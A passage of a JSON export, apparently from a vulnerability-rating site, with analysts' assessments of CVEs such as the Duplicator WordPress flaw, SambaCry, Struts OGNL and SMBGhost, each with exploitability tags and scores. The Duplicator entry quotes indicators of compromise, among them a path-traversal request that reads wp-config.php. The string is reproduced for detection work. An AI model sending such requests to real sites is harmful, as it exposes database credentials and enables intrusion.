          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "f8a2782b-29ad-4faa-aa14-eee468fec909",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "3d8169d0-d511-4352-be48-b23ac7b3d05e",
      "created": "2020-04-14T13:56:32.613584Z",
      "revisionDate": "2020-04-16T21:42:35.042044Z",
      "document": "Security products are notorious targets for attack because for them to perform their function, they must be elevated, so gaining execution means immediate execution as a privileged user.  This CVE was discovered along with four other vulnerabilities after an internal review by Trend Micro Security Research:\r\nCVE-2020-8468\r\nCVE-2020-8470\r\nCVE-2020-8598\r\nCVE-2020-8599\r\nThere is evidence that this CVE (8467) and 8468 have exploit candidates that were seen in the wild.  At this time, there are no PoCs that I could discover.\r\n\r\nThis CVE (8467) is an attack against a migration tool in Apex One and OfficeScan XG.  The exact details are very murky, so it is hard to say what the remote attack surface is or how difficult it is to exploit.  We can make some guesses as Trend Micro is relatively popular and remains a trusted enterprise security product.",
      "score": 2,
      "metadata": {
        "tags": [
          "default_configuration",
          "high_privilege_access",
          "pre_auth",
          "common_enterprise"
        ],
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "97241c52-0083-4b93-8da4-58fb634ad32d",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "f4006719-3e8d-4bcf-8afe-fa90832bb435",
      "created": "2020-04-14T14:05:25.755279Z",
      "revisionDate": "2020-04-14T14:05:25.758484Z",
      "document": "Security products are notorious targets for attack because for them to perform their function, they must be elevated, so gaining execution means immediate execution as a privileged user. This CVE was discovered along with four other vulnerabilities after an internal review by Trend Micro Security Research:\r\nCVE-2020-8468\r\nCVE-2020-8470\r\nCVE-2020-8598\r\nCVE-2020-8599\r\n\r\nThere is evidence that this CVE (8468) and 8467 have exploit candidates that were seen in the wild. At this time, there are no PoCs that I could discover.\r\n\r\nTrend Micro defines this vulnerability as a \"content validation escape.\"  That sounds like a specially-crafted config file, so mitigation may include looking for configuration files on filesystems, but that's a stretch.  Many aspects on this will likely have to wait until we see more information come out, but there is a patch, so that is a likely strong starting point.\r\n",
      "score": 1,
      "metadata": {
        "tags": [
          "requires_interaction",
          "difficult_to_develop",
          "common_enterprise",
          "default_configuration",
          "post_auth",
          "high_privilege_access"
        ]
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "03bb4ce6-a422-45ce-9195-36fdda784fb2",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "7b975634-2048-4113-92b7-d2e74d1cee74",
      "created": "2020-04-14T14:38:31.6765Z",
      "revisionDate": "2020-04-27T20:54:18.889017Z",
      "document": "This plugin is recorded as having over 1 Million installations via Wordpress - https://wordpress.org/plugins/duplicator/\r\nIt has a free and a pro version with both being impacted. \r\n\r\nOther reporting suggests that there are around 170,000 active installations. with ~ 150,000 of these not on the latest version.\r\n\r\nThe vulnerability allows arbitrary file read of any file on disk in the context of the web application. This kind of attack *can* lead to further compromise depending on its setup and configuration. Using this level of access can lead to database credentials being compromised which in turn can lead to further exploitation. \r\n\r\nThis exploit has been seen in active campaigns as reported by wordfence - https://www.wordfence.com/blog/2020/02/active-attack-on-recently-patched-duplicator-plugin-vulnerability-affects-over-1-million-sites/\r\n\r\n\r\n\r\nIOC's Shared by wordpress and replicated here for ease of discovery. \r\n\r\nIndicators Of Compromise (IOCs)\r\nThe following Indicators of Compromise (IOCs) can be used to determine if your site may have been attacked.\r\n\r\nTraffic logged from the threat actor\u2019s IP address should be considered suspicious:\r\n- 77.71.115.52\r\n  - Attacks in this campaign are issued via GET requests with the following query strings:\r\n- action=duplicator_download\r\n  - file=/../wp-config.php\r\n  - Note: Because this vulnerability can be exploited via WP AJAX, it\u2019s possible to exploit via POST request. In this case, it\u2019s possible for the action parameter to be passed in the POST body instead of the query string. This will prevent the action=duplicator_download string from appearing in HTTP logs. The file parameter must be passed as a query string, however, and is a reliable indicator.",
      "score": 4,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "7c324b6e-0d83-4392-a79f-b61220ebfff3",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "49aaf9a1-b710-4ca1-aafa-3c022294a5d4",
      "created": "2020-04-14T16:47:04.345906Z",
      "revisionDate": "2020-04-14T16:47:04.349096Z",
      "document": "This vulnerability was the Linux equivalent to Wanncry according to some journalists.  It was not.\r\nThis vulnerability (AKA SambaCry) worked by writing a link library (.so file) to a linux host running Sama in such a way that samba then loaded it.  On the face of it, this was a problem, but attackers had 2 large hurdles:\r\n1. Anonymous file creation had to be enabled and\r\n2. Attackers had to guess the right absolute path\r\n\r\nIn the first case, it is unlikely any enterprise will have anonymous file creation turned on, so immediately attackers are thwarted.  In the second case, an attacker must guess the absolute path to the share as it is mounted on the remote computer.  There are obvious guesses attackers could make, but nothing that was guaranteed.  This was the classic example of a terrifying exploit mitigated by large caveats.  Most common-sense approaches to SAMBA and SMB shared will mitigate this threat, namely not opening SMB/SAMBA shares to the internet, not allowing anonymous logins, and keeping software up to date.",
      "score": 1,
      "metadata": {
        "tags": [
          "obscure_configuration",
          "difficult_to_develop",
          "common_enterprise",
          "high_privilege_access",
          "pre_auth"
        ]
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "13315e0a-ba61-4e8b-bb54-0bdbf066a20b",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "4aa28dd7-15c7-4892-96a3-0190ea268037",
      "created": "2020-04-14T18:33:59.324323Z",
      "revisionDate": "2020-09-03T16:30:24.013921Z",
      "document": "This vulnerability exists within the Apache Struts OGNL method dispatch routine. An attacker can submit a specially crafted HTTP request to a vulnerable web server. Specifically an attacker can taint the `name` parameter passed to [`OgnlUtil::getValue()`](https://lgtm.com/projects/g/apache/struts/snapshot/02518d8149ff0b60863b4012cd3268cf0f2942b7/files/core/src/main/java/com/opensymphony/xwork2/ognl/OgnlUtil.java?sort=name&dir=ASC&mode=heatmap#L301).\r\n\r\nExploitation of this vulnerability would lead to code execution within the context of the Java process powering the server. An indicator of compromise will be present in the logs at the `DEBUG` level. This IOC will look like a malformed value in the `Executing action method =` message.\r\n\r\nThe default configuration is not vulnerable. The `alwaysSelectFullNamespace` option must be enabled. This can be done by adding `<constant name=\"struts.mapper.alwaysSelectFullNamespace\" value=\"true\" />` to the `struts.xml` configuration file.",
      "score": 3,
      "metadata": {
        "tags": [
          "common_enterprise",
          "difficult_to_patch",
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "af31415a-8fca-4b54-8e3b-e45b1f114967",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "e85583cb-111d-4d95-80e5-4cd53bb1f952",
      "created": "2020-04-15T16:10:43.608642Z",
      "revisionDate": "2021-08-16T22:38:31.646791Z",
      "document": "A vulnerability exists in how SMB3 Compressed data is handled that can be leveraged to write data out of normal bounds. This vulnerability is triggered by sending a specially crafted `COMPRESSION_TRANSFORM_HEADER` as defined in subsections of [MS-SMB2 2.2.42](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/1d435f21-9a21-4f4c-828e-624a176cf2a0). The `OriginalCompressedSegmentSize` value triggers an integer overflow when it is set to a large value. This vulnerability could be triggered prior to authenticating to the server.\r\n\r\nWhen details of this vulnerability were first made public, the vulnerability was unpatched. The official recommendation from Microsoft was to disable SMB3 compression as a temporary fix.\r\n\r\nDue to modern mitigation technologies, exploiting this vulnerability remotely to obtain code execution is non-trivial. Public [PoCs](https://www.exploit-db.com/exploits/48216) do exist which trigger the vulnerable code path, and one serves as an example of using this vulnerability in the context of a [local privilege escalation](https://github.com/rapid7/metasploit-framework/pull/13187/files) technique.",
      "score": 7,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "difficult_to_develop",
          "common_enterprise",
          "default_configuration"
        ],
        "attacker-value": 4,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "e22c6f5f-430f-4ab7-8a0f-6a5a0af6c87b",
      "editorId": "c3ff5371-0add-4984-8aa8-7a93c72af5ea",
      "topicId": "236680fb-f804-4f5d-b51d-4b50c9f69bbd",
      "created": "2020-04-15T16:11:12.480073Z",
      "revisionDate": "2020-12-12T23:57:50.814545Z",
      "document": "Can download the session DB in one request and escalate to admin on the VPN concentrator. May not be configured to log unauthenticated requests. Causes massive damage. If not patched, likely wrecked.",
      "score": 3,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "easy_to_develop",
          "common_enterprise",
          "default_configuration",
          "pre_auth"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "9a895aba-7e18-4422-bce7-722dfd607964",
      "editorId": "c3ff5371-0add-4984-8aa8-7a93c72af5ea",
      "topicId": "d165638b-97c5-4c99-bfa0-70576db52324",
      "created": "2020-04-15T16:14:28.751093Z",
      "revisionDate": "2020-04-15T16:14:28.755248Z",
      "document": "A bit legendary at this point but memory chunks from VPN devices was a real problem. If vulnerable, got hit.",
      "score": 1,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "25f3010a-5e6f-4215-be06-fa0bc7bf9009",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "85036bc9-e798-46ce-a5b3-43bdcfe83346",
      "created": "2020-04-15T16:15:56.156991Z",
      "revisionDate": "2020-04-18T19:51:47.355147Z",
      "document": "The vmdir VCenter process appears to expose internal data via an unauthenticated, unencrypted LDAP service. See Metasploit module PR for exploitation details: https://github.com/rapid7/metasploit-framework/pull/13253 . Given that this vuln appears to not exist in a 'fresh' install, this looks like a legacy configuration option that should have been disabled much earlier. Possible that importing an old configuration might reenable this.\r\n\r\nSince my original assessment, we found that this vulnerability also allows anyone with unauthenticated network access to create arbitrary users in vCenter, allowing for full unauthorized access to the vCenter environment and the virtual machines within.\r\n\r\nBlocking LDAP port 389 may be an intermediate mitigation.",
      "score": 9,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "easy_to_develop",
          "pre_auth",
          "high_privilege_access"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "3353d6ee-9507-4646-a69e-919d8717000c",
      "editorId": "c3ff5371-0add-4984-8aa8-7a93c72af5ea",
      "topicId": "ef06dfea-51b0-4eef-853f-df7bb23652f6",
      "created": "2020-04-15T16:16:13.955559Z",
      "revisionDate": "2020-04-17T17:17:53.470874Z",
      "document": "Was the bread and butter for many phishing campaigns for years.",
      "score": 2,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "easy_to_develop",
          "requires_interaction"
        ],
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "79a9f701-8c0e-4344-ac6f-ae3e0844e3f1",
      "editorId": "c3ff5371-0add-4984-8aa8-7a93c72af5ea",
      "topicId": "b7c679e9-6ecb-4663-bf1e-330295e69cc4",
      "created": "2020-04-15T16:17:03.124869Z",
      "revisionDate": "2020-04-17T17:17:36.370921Z",
      "document": "Was obvious the week it hit that it would replace 2010-3333, and it did. Bread and butter for many phishing campaigns for years.",
      "score": 2,
      "metadata": {
        "tags": [
          "common_enterprise",
          "high_privilege_access",
          "easy_to_develop",
          "requires_interaction"
        ],
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "a3826797-4f7b-42c3-ae6a-5449b29d63d0",
      "editorId": "b44e271f-3a31-454a-9144-7a8f9341dca1",
      "topicId": "59efdec4-921e-411a-8743-cb603c4bc068",
      "created": "2020-04-15T16:26:24.551004Z",
      "revisionDate": "2020-12-28T19:32:34.463458Z",
      "document": "Less impact on systems running windows 10  1703 and later, as all fonts are processed in user-mode app-container sandbox and successful exploitation gives limited privileges and capabilities within the sandbox.\r\n\r\nPatch: Released by Microsoft.",
      "score": 3,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "no_useful_data"
        ],
        "attacker-value": 2,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "1a7cdf85-e526-4a59-9f0e-b1fe896aa773",
      "editorId": "b44e271f-3a31-454a-9144-7a8f9341dca1",
      "topicId": "a0f1f10f-2c45-4d3d-908c-2d0292b421fa",
      "created": "2020-04-15T16:47:42.251859Z",
      "revisionDate": "2020-04-15T16:47:42.256862Z",
      "document": "The attack complexity is very less, as the attacker needs to run a specially crafted application, either by gaining physical access or by social engineering in order to exploit this. \r\n\r\nPatch: Released by Microsoft.",
      "score": 1,
      "metadata": {
        "tags": [
          "requires_interaction",
          "difficult_to_develop",
          "default_configuration",
          "high_privilege_access"
        ],
        "attacker-value": 1,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "0c3071de-4dfb-4222-b7ad-3d64ef528aae",
      "editorId": "c3ff5371-0add-4984-8aa8-7a93c72af5ea",
      "topicId": "aa572341-0b41-4218-af1a-83aa4a217357",
      "created": "2020-04-15T19:18:48.304749Z",
      "revisionDate": "2020-04-15T19:18:48.309671Z",
      "document": "A rather prolific exploit from the summer of '12. A couple Chinese intrusion sets went ham with this almost as a final hurrah considering the exposure it brought on them and how things changed over the years to follow.",
      "score": 1,
      "metadata": {
        "tags": [
          "common_enterprise",
          "easy_to_develop",
          "default_configuration",
          "high_privilege_access",
          "requires_interaction"
        ],
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "f1985629-97d7-4f7f-ba67-27c6990c95d2",
      "editorId": "c3ff5371-0add-4984-8aa8-7a93c72af5ea",
      "topicId": "9b2aa01b-8c6f-493e-8849-a3dcaf097f12",
      "created": "2020-04-15T19:23:57.848826Z",
      "revisionDate": "2020-04-15T19:23:57.852537Z",
      "document": "One of a slew of PDF exploits actively used in phishing campaigns and even exploit kits for a few years.",
      "score": 1,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "easy_to_develop",
          "requires_interaction"
        ],
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "256d3d9f-769e-4f06-be6e-0a63410ab45c",
      "editorId": "c3ff5371-0add-4984-8aa8-7a93c72af5ea",
      "topicId": "afc76977-d355-470d-a7f6-fef7a8352b65",
      "created": "2020-04-16T00:56:33.460685Z",
      "revisionDate": "2020-04-17T02:14:37.499994Z",
      "document": "Numerous public reporting on this being leveraged to enter org perimeter appliance.",
      "score": 2,
      "metadata": {
        "tags": [
          "default_configuration",
          "easy_to_develop",
          "common_enterprise",
          "high_privilege_access",
          "pre_auth"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
